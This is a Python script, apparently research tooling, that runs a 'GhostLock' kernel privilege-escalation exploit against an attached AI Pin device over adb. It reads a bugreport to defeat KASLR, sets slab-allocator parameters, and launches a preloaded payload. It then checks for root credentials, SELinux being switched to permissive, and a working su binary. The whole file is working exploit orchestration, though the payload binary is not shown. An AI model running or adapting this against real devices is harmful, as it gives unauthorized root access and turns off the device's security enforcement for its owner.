#!/usr/bin/env python3
"""Fail-closed, production-equivalent GhostLock runner for an attached AI Pin.

The runner requires an unprivileged adb shell, SELinux enforcing, a pinned
profile manifest/payload hash, and a two-symbol KASLR derivation from the
current boot's bugreport.  It never changes adbd privilege or tracefs.
"""

from __future__ import annotations

import argparse
import hashlib
import json
import os
import queue
import re
import shlex
import signal
import subprocess
import sys
import threading
import time
from dataclasses import asdict, dataclass
from datetime import datetime, timezone
from pathlib import Path


ROOT = Path(__file__).resolve().parents[1]
if str(ROOT) not in sys.path:
    sys.path.insert(0, str(ROOT))

from ghostlock_profile import (  # noqa: E402
    AllocatorGeometry,
    ProfileError,
    TargetProfile,
    load_profiles,
    profile_by_id,
    verify_payload_profile_binding,
)
from ghostlock_bugreport_kaslr import KaslrParseError, KaslrResult, parse_bugreport


DEFAULT_REMOTE_PAYLOAD = "/data/local/tmp/preload.so"
DEFAULT_REMOTE_SU = "/data/local/tmp/su"
DEFAULT_ATTEMPT_MARKER = "/data/local/tmp/.ghostlock-aipin-attempt"
FORBIDDEN_ADB_SUBCOMMANDS = frozenset(("root", "unroot"))
PROFILES_ROOT = ROOT / "profiles"


class RunnerError(RuntimeError):
    pass


@dataclass(frozen=True)
class DeviceState:
    serial: str
    uid: str
    context: str
    selinux: str
    boot_id: str
    boot_epoch: str
    uptime_seconds: float
    fingerprint: str
    kernel: str
    kernel_release: str
    slot: str
    abi: str
    payload_sha256: str


def utc_now() -> str:
    return datetime.now(timezone.utc).isoformat()


def sha256_file(path: Path) -> str:
    digest = hashlib.sha256()
    with path.open("rb") as handle:
        for chunk in iter(lambda: handle.read(1024 * 1024), b""):
            digest.update(chunk)
    return digest.hexdigest()


def assert_payload_profile_binding(
    path: Path,
    profile: TargetProfile,
    expected_payload_sha256: str,
) -> None:
    try:
        verify_payload_profile_binding(
            path, profile, expected_payload_sha256
        )
    except ProfileError as exc:
        raise RunnerError(f"local {exc}") from exc


class Adb:
    def __init__(self, serial: str, executable: str = "adb") -> None:
        self.serial = serial
        self.executable = executable

    def run(
        self,
        *args: str,
        timeout: int = 30,
        check: bool = True,
    ) -> subprocess.CompletedProcess[str]:
        if args and args[0] in FORBIDDEN_ADB_SUBCOMMANDS:
            raise RunnerError(f"forbidden adb subcommand requested: {args[0]}")
        command = [self.executable, "-s", self.serial, *args]
        try:
            result = subprocess.run(
                command,
                text=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                timeout=timeout,
                check=False,
            )
        except (OSError, subprocess.TimeoutExpired) as exc:
            raise RunnerError(f"command failed: {shlex.join(command)}: {exc}") from exc
        result.stdout = result.stdout.replace("\r", "")
        if check and result.returncode != 0:
            raise RunnerError(
                f"command exited {result.returncode}: {shlex.join(command)}\n"
                f"{result.stdout.strip()}"
            )
        return result

    def shell(self, command: str, *, timeout: int = 30, check: bool = True):
        return self.run("shell", command, timeout=timeout, check=check)


def shell_value(adb: Adb, command: str) -> str:
    return adb.shell(command).stdout.strip()


def capture_state(adb: Adb, remote_payload: str) -> DeviceState:
    state = adb.run("get-state").stdout.strip()
    if state != "device":
        raise RunnerError(f"adb state is {state!r}, expected 'device'")
    remote_sha = shell_value(
        adb, f"toybox sha256sum {shlex.quote(remote_payload)} 2>/dev/null"
    ).split()
    if not remote_sha:
        raise RunnerError(f"cannot hash remote payload {remote_payload}")
    boot_epoch = shell_value(
        adb, "sed -n 's/^btime //p' /proc/stat | head -n 1"
    )
    uptime_text = shell_value(adb, "cut -d ' ' -f 1 /proc/uptime")
    if not re.fullmatch(r"[0-9]+", boot_epoch):
        raise RunnerError(f"invalid kernel boot epoch {boot_epoch!r}")
    try:
        uptime_seconds = float(uptime_text)
    except ValueError as exc:
        raise RunnerError(f"invalid kernel uptime {uptime_text!r}") from exc
    if uptime_seconds < 0:
        raise RunnerError(f"invalid negative kernel uptime {uptime_seconds}")

    return DeviceState(
        serial=adb.serial,
        uid=shell_value(adb, "id -u"),
        context=shell_value(adb, "id -Z"),
        selinux=shell_value(adb, "getenforce"),
        boot_id=shell_value(adb, "cat /proc/sys/kernel/random/boot_id"),
        boot_epoch=boot_epoch,
        uptime_seconds=uptime_seconds,
        fingerprint=shell_value(adb, "getprop ro.build.fingerprint"),
        kernel=shell_value(adb, "uname -a"),
        kernel_release=shell_value(adb, "uname -r"),
        slot=shell_value(adb, "getprop ro.boot.slot_suffix"),
        abi=shell_value(adb, "getprop ro.product.cpu.abi"),
        payload_sha256=remote_sha[0].lower(),
    )


def assert_production_equivalent(
    state: DeviceState,
    *,
    profile: TargetProfile,
    expected_payload_sha256: str,
    expected_selinux: str = "Enforcing",
) -> None:
    if state.uid != "2000":
        raise RunnerError(
            f"adbd shell must be uid 2000; observed uid {state.uid}. "
            "This run is not production-equivalent."
        )
    if state.context != "u:r:shell:s0":
        raise RunnerError(f"unexpected adb shell context {state.context!r}")
    if state.selinux != expected_selinux:
        raise RunnerError(
            f"SELinux must be {expected_selinux}; observed {state.selinux!r}"
        )
    if state.payload_sha256 != expected_payload_sha256.lower():
        raise RunnerError(
            "remote payload hash mismatch: "
            f"expected {expected_payload_sha256}, observed {state.payload_sha256}"
        )
    mismatches = profile.mismatches(
        fingerprint=state.fingerprint,
        kernel=state.kernel,
        kernel_release=state.kernel_release,
        slot=state.slot,
        abi=state.abi,
    )
    if mismatches:
        raise RunnerError("profile mismatch: " + "; ".join(mismatches))


def assert_same_boot(
    before: DeviceState,
    after: DeviceState,
    *,
    allow_boot_id_scratch: bool = False,
) -> None:
    fields = [
        "serial",
        "boot_epoch",
        "fingerprint",
        "kernel",
        "kernel_release",
        "slot",
        "abi",
        "payload_sha256",
    ]
    if not allow_boot_id_scratch:
        fields.append("boot_id")
    changed = [
        field
        for field in fields
        if getattr(before, field) != getattr(after, field)
    ]
    if changed:
        details = ", ".join(
            f"{field}={getattr(before, field)!r}->{getattr(after, field)!r}"
            for field in changed
        )
        raise RunnerError(f"device identity changed during run: {details}")
    if after.uptime_seconds + 2.0 < before.uptime_seconds:
        raise RunnerError(
            "device uptime moved backwards during run: "
            f"{before.uptime_seconds:.2f}->{after.uptime_seconds:.2f}"
        )


def assert_root_markers(log_text: str, profile: TargetProfile) -> None:
    required = {
        "profile identity": re.escape(
            f"target kernel accepted profile={profile.profile_id} "
            f"manifest_sha256={profile.manifest_sha256} "
            f"image_sha256={profile.kernel_image_sha256} "
            f"symbols_sha256={profile.symbols_sha256}"
        ),
        "same-attempt reclaim capture": (
            r"perf reclaim gate result verified=1 .*free=1 alloc=1"
        ),
        "credential transition": (
            r"direct credential result uid=0 euid=0 gid=0 egid=0 .*"
            r"selinux=1->0"
        ),
        "root summary": (
            r"direct-root-summary root=1 id=1 su=1/"
        ),
    }
    missing = [
        name for name, pattern in required.items()
        if re.search(pattern, log_text) is None
    ]
    if missing:
        raise RunnerError(
            "exploit output lacks required proof marker(s): " + ", ".join(missing)
        )


def ensure_no_preexisting_root(adb: Adb, remote_su: str) -> None:
    result = adb.shell(
        f"{shlex.quote(remote_su)} -c id", timeout=15, check=False
    )
    if result.returncode == 0 and "uid=0(root)" in result.stdout:
        raise RunnerError(
            "pre-existing su access is active; refusing to count this as a clean replay"
        )


def attempt_token(state: DeviceState) -> str:
    # The exploit intentionally repoints the boot_id sysctl data pointer.
    # The kernel boot epoch and immutable fingerprint remain stable.
    return f"{state.boot_epoch} {state.fingerprint}"


def ensure_no_same_boot_attempt(
    adb: Adb, state: DeviceState, marker_path: str
) -> None:
    result = adb.shell(
        f"cat {shlex.quote(marker_path)} 2>/dev/null", check=False
    )
    if result.stdout.strip() == attempt_token(state):
        raise RunnerError(
            "this kernel boot already had an exploit attempt; reboot the Pin before retrying"
        )


def mark_same_boot_attempt(
    adb: Adb, state: DeviceState, marker_path: str
) -> None:
    token = shlex.quote(attempt_token(state))
    path = shlex.quote(marker_path)
    adb.shell(f"umask 077; printf '%s\\n' {token} > {path}")


def make_bugreport(adb: Adb, destination: Path, timeout: int) -> None:
    destination.parent.mkdir(parents=True, exist_ok=True)
    result = adb.run("bugreport", str(destination), timeout=timeout, check=False)
    if result.returncode != 0 or not destination.is_file():
        raise RunnerError(
            f"bugreport capture failed with exit {result.returncode}: "
            f"{result.stdout.strip()}"
        )


def build_exploit_argv(
    runtime_text_base: int,
    remote_payload: str,
    *,
    geometry: AllocatorGeometry,
) -> list[str]:
    return [
        "/system/bin/env",
        f"AI_PIN_MM_OBJECT_SIZE={geometry.object_size}",
        f"AI_PIN_MM_SLAB_SIZE={geometry.slab_size}",
        f"AI_PIN_MM_ORDER={geometry.order}",
        f"AI_PIN_MM_OBJS_PER_SLAB={geometry.objects_per_slab}",
        f"AI_PIN_MM_CPU_PARTIAL={geometry.cpu_partial}",
        "AI_PIN_PERF_RECLAIM_GATE=1",
        "AI_PIN_SLIDE_LEAK=2",
        f"AI_PIN_KASLR_BASE=0x{runtime_text_base:016x}",
        f"LD_PRELOAD={remote_payload}",
        "/system/bin/true",
    ]


def stream_process(command: list[str], log_path: Path, timeout: int) -> int:
    output_queue: queue.Queue[str | None] = queue.Queue()
    with log_path.open("w", encoding="utf-8") as log:
        process = subprocess.Popen(
            command,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=True,
            bufsize=1,
            start_new_session=True,
        )

        def reader() -> None:
            assert process.stdout is not None
            for line in process.stdout:
                output_queue.put(line.replace("\r", ""))
            output_queue.put(None)

        thread = threading.Thread(target=reader, daemon=True)
        thread.start()
        deadline = time.monotonic() + timeout
        stream_closed = False
        while not stream_closed:
            remaining = deadline - time.monotonic()
            if remaining <= 0:
                os.killpg(process.pid, signal.SIGTERM)
                try:
                    process.wait(timeout=5)
                except subprocess.TimeoutExpired:
                    os.killpg(process.pid, signal.SIGKILL)
                raise RunnerError(f"exploit command exceeded {timeout} seconds")
            try:
                line = output_queue.get(timeout=min(1.0, remaining))
            except queue.Empty:
                continue
            if line is None:
                stream_closed = True
                continue
            print(line, end="", flush=True)
            log.write(line)
            log.flush()
        return process.wait(timeout=10)


def kaslr_json(result: KaslrResult) -> dict[str, object]:
    return {
        "report_member": result.report_member,
        "link_text_base": f"0x{result.link_text_base:016x}",
        "runtime_text_base": f"0x{result.runtime_text_base:016x}",
        "slide": f"0x{result.slide:x}",
        "anchors": [
            {
                **asdict(anchor),
                "offset": f"0x{anchor.offset:x}",
                "link_address": f"0x{anchor.link_address:016x}",
                "runtime_address": f"0x{anchor.runtime_address:016x}",
                "slide": f"0x{anchor.slide:x}",
            }
            for anchor in result.anchors
        ],
    }


def write_manifest(path: Path, manifest: dict[str, object]) -> None:
    temporary = path.with_suffix(path.suffix + ".tmp")
    temporary.write_text(
        json.dumps(manifest, indent=2, sort_keys=True) + "\n", encoding="utf-8"
    )
    temporary.replace(path)


def main(argv: list[str] | None = None) -> int:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--serial", required=True)
    parser.add_argument("--profile-id", required=True)
    parser.add_argument("--profile-sha256", required=True)
    parser.add_argument("--expected-boot-id")
    parser.add_argument("--bugreport", type=Path)
    parser.add_argument(
        "--retain-bugreport",
        action="store_true",
        help="retain a newly captured raw bugreport (privacy-sensitive)",
    )
    parser.add_argument("--bugreport-timeout", type=int, default=600)
    parser.add_argument("--payload-sha256", required=True)
    parser.add_argument("--remote-payload", default=DEFAULT_REMOTE_PAYLOAD)
    parser.add_argument("--remote-su", default=DEFAULT_REMOTE_SU)
    parser.add_argument("--attempt-marker", default=DEFAULT_ATTEMPT_MARKER)
    parser.add_argument("--timeout", type=int, default=3600)
    parser.add_argument("--output-dir", type=Path)
    parser.add_argument("--execute", action="store_true")
    args = parser.parse_args(argv)

    if not re.fullmatch(r"[0-9a-fA-F]{64}", args.payload_sha256):
        parser.error("--payload-sha256 must be exactly 64 hexadecimal characters")
    if not re.fullmatch(r"[0-9a-f]{64}", args.profile_sha256):
        parser.error("--profile-sha256 must be exactly 64 lowercase hexadecimal characters")
    if args.timeout < 60 or args.bugreport_timeout < 60:
        parser.error("timeouts must be at least 60 seconds")
    try:
        profile = profile_by_id(load_profiles(PROFILES_ROOT), args.profile_id)
    except ProfileError as exc:
        parser.error(str(exc))
    if profile.manifest_sha256 != args.profile_sha256:
        parser.error(
            "profile manifest hash mismatch: "
            f"expected {args.profile_sha256}, observed {profile.manifest_sha256}"
        )
    geometry = profile.allocator_geometry
    local_payload = (
        ROOT / "source" / "build" / profile.project / "bin" / "preload.so"
    )
    try:
        assert_payload_profile_binding(
            local_payload, profile, args.payload_sha256
        )
    except RunnerError as exc:
        parser.error(str(exc))

    timestamp = datetime.now().strftime("%Y%m%d-%H%M%S")
    output_dir = args.output_dir or Path(
        f"/private/tmp/ghostlock-prod-equivalent-{timestamp}"
    )
    output_dir.mkdir(parents=True, exist_ok=False)
    output_dir.chmod(0o700)
    manifest_path = output_dir / "manifest.json"
    manifest: dict[str, object] = {
        "started_at": utc_now(),
        "mode": "execute" if args.execute else "preflight-only",
        "serial": args.serial,
        "profile_id": profile.profile_id,
        "profile_manifest": str(profile.manifest_path),
        "profile_sha256": profile.manifest_sha256,
        "kernel_image_sha256": profile.kernel_image_sha256,
        "local_payload": str(local_payload),
        "symbols": str(profile.symbols_path),
        "symbols_sha256": profile.symbols_sha256,
        "mm_geometry": asdict(geometry),
        "output_dir": str(output_dir),
    }

    transient_bugreport: Path | None = None
    try:
        adb = Adb(args.serial)
        initial = capture_state(adb, args.remote_payload)
        assert_production_equivalent(
            initial,
            profile=profile,
            expected_payload_sha256=args.payload_sha256,
        )
        if args.expected_boot_id and initial.boot_id != args.expected_boot_id:
            raise RunnerError(
                f"boot ID mismatch: expected {args.expected_boot_id}, "
                f"observed {initial.boot_id}"
            )
        ensure_no_preexisting_root(adb, args.remote_su)
        ensure_no_same_boot_attempt(adb, initial, args.attempt_marker)
        manifest["initial_state"] = asdict(initial)

        bugreport = args.bugreport
        captured_in_this_run = bugreport is None
        if captured_in_this_run:
            bugreport = output_dir / f"bugreport-{args.serial}-{timestamp}.zip"
            if not args.retain_bugreport:
                transient_bugreport = bugreport
            print(f"capturing current-boot bugreport to {bugreport}", flush=True)
            make_bugreport(adb, bugreport, args.bugreport_timeout)
        if not bugreport.is_file():
            raise RunnerError(f"bugreport does not exist: {bugreport}")
        manifest["bugreport"] = str(bugreport.resolve())
        manifest["bugreport_sha256"] = sha256_file(bugreport)
        manifest["bugreport_retained"] = (
            not captured_in_this_run or args.retain_bugreport
        )

        kaslr = parse_bugreport(
            bugreport,
            profile.symbols_path,
            # Retail dumpstate omits linuxBootId.  A bugreport captured by this
            # runner is still boot-bound: capture_state() brackets dumpstate
            # and assert_same_boot() checks boot ID, boot epoch and uptime
            # before --execute can proceed.  Pre-existing bugreports retain the
            # stronger in-report boot-ID requirement.
            expected_boot_id=None if captured_in_this_run else initial.boot_id,
            expected_serial=args.serial,
            expected_fingerprint=profile.fingerprint,
        )
        manifest["bugreport_binding"] = (
            "synchronous-before-after-device-state"
            if captured_in_this_run
            else "embedded-linuxBootId"
        )
        manifest["kaslr"] = kaslr_json(kaslr)
        if transient_bugreport is not None:
            transient_bugreport.unlink()
            transient_bugreport = None
            manifest["bugreport"] = None
            print("discarded raw bugreport after KASLR extraction", flush=True)
        print(
            f"KASLR base 0x{kaslr.runtime_text_base:016x} accepted from "
            f"{len(kaslr.anchors)} agreeing WARN anchors",
            flush=True,
        )

        pinned = capture_state(adb, args.remote_payload)
        assert_production_equivalent(
            pinned,
            profile=profile,
            expected_payload_sha256=args.payload_sha256,
        )
        assert_same_boot(initial, pinned)
        manifest["pinned_state"] = asdict(pinned)
        manifest["preflight"] = "green"
        write_manifest(manifest_path, manifest)
        print(
            "preflight green: adbd uid=2000, shell domain, SELinux enforcing, "
            "identity and payload pinned",
            flush=True,
        )

        if not args.execute:
            manifest["completed_at"] = utc_now()
            manifest["result"] = "preflight-only"
            write_manifest(manifest_path, manifest)
            return 0

        mark_same_boot_attempt(adb, pinned, args.attempt_marker)
        manifest["attempt_marker"] = args.attempt_marker
        manifest["attempt_token"] = attempt_token(pinned)
        write_manifest(manifest_path, manifest)

        exploit_argv = build_exploit_argv(
            kaslr.runtime_text_base,
            args.remote_payload,
            geometry=geometry,
        )
        remote_command = shlex.join(exploit_argv)
        host_command = ["adb", "-s", args.serial, "shell", remote_command]
        manifest["exploit_argv"] = exploit_argv
        write_manifest(manifest_path, manifest)
        print("starting production-equivalent exploit attempt", flush=True)
        exploit_rc = stream_process(
            host_command, output_dir / "run.log", args.timeout
        )
        manifest["exploit_returncode"] = exploit_rc

        final_state = capture_state(adb, args.remote_payload)
        assert_same_boot(initial, final_state, allow_boot_id_scratch=True)
        manifest["final_state"] = asdict(final_state)
        manifest["boot_id_scratch_observed"] = (
            initial.boot_id != final_state.boot_id
        )
        if exploit_rc != 0:
            raise RunnerError(f"exploit command returned {exploit_rc}")

        assert_production_equivalent(
            final_state,
            profile=profile,
            expected_payload_sha256=args.payload_sha256,
            expected_selinux="Permissive",
        )

        run_log_text = (output_dir / "run.log").read_text(
            encoding="utf-8", errors="replace"
        )
        assert_root_markers(run_log_text, profile)

        acceptance = adb.shell(
            f"{shlex.quote(args.remote_su)} -c id", timeout=30, check=False
        )
        (output_dir / "acceptance.txt").write_text(
            acceptance.stdout, encoding="utf-8"
        )
        manifest["acceptance_returncode"] = acceptance.returncode
        manifest["acceptance_output"] = acceptance.stdout.strip()
        if acceptance.returncode != 0 or "uid=0(root)" not in acceptance.stdout:
            raise RunnerError(
                "fresh-shell acceptance failed: " + acceptance.stdout.strip()
            )
        manifest["result"] = "root-via-production-equivalent-chain"
        manifest["completed_at"] = utc_now()
        write_manifest(manifest_path, manifest)
        print(acceptance.stdout.strip(), flush=True)
        print(f"evidence written to {output_dir}", flush=True)
        return 0
    except (RunnerError, KaslrParseError, OSError) as exc:
        manifest["completed_at"] = utc_now()
        manifest["result"] = "failed-closed"
        manifest["error"] = str(exc)
        try:
            write_manifest(manifest_path, manifest)
        except OSError:
            pass
        print(f"ERROR: {exc}", file=sys.stderr, flush=True)
        return 2
    finally:
        if transient_bugreport is not None:
            try:
                transient_bugreport.unlink(missing_ok=True)
            except OSError:
                pass


if __name__ == "__main__":
    raise SystemExit(main())
